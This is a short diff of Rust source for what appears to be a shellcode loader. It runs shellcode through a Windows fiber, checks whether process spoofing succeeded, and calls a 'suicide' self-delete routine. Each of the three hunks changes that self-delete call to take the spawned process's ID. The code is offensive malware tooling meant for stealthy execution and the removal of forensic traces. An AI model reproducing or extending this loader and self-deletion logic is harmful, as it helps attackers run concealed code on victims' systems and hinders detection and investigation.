@@ -269,7 +269,7 @@ fn main() -> Result<()> {
                 SwitchToFiber(shellcode_fiber);
                 // may not reach
                 if use_delete {
-                    let _ = suicide::delete_self();
+                    let _ = suicide::delete_self(Some(pi.dwProcessId));
                 }
             }
 
@@ -314,7 +314,7 @@ fn main() -> Result<()> {
                 // if spoof worked, suicide and exit
                 if spoofing_successful {
                     if use_delete {
-                        let _ = suicide::delete_self();
+                        let _ = suicide::delete_self(Some(pi.dwProcessId));
                     }
                     return Ok(());
                 }
@@ -368,7 +368,7 @@ fn main() -> Result<()> {
 
                 // attempt self-delete
                 if use_delete {
-                    let _ = suicide::delete_self();
+                    let _ = suicide::delete_self(Some(pi.dwProcessId));
                 }
             }
 
